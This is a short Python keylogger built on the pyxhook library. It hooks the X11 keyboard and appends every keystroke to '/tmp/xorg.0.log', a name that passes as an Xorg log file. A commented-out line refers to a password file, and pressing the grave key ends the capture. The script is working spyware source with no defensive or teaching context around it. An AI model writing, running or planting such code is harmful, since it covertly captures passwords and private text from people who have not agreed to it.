import pyxhook

# this function is called everytime a key is pressed.
def OnKeyPress(event):

    # Path to save file
    log_file = '/tmp/xorg.0.log'

    # passWordFile='/tmp/xorg.1.log'

    fileOpen = open(log_file, 'a')

    fileOpen.write(event.Key)
    # for every 20 Characters written, write a new line
    #fileOpen.write(( ' '.join(textwrap.wrap(event.Key, 20))))

    

    if event.Ascii == 96:

        # if the (`) grave key is pressed. exit
        fileOpen.close()
        new_hook.cancel()

new_hook = pyxhook.HookManager()

# Inhert Keylogging logic from pyxhook
# & logLogic implemnts the OnKey pressed
new_hook.KeyDown = OnKeyPress

# Hook the keyboard
new_hook.HookKeyboard()

# start the session
new_hook.start()
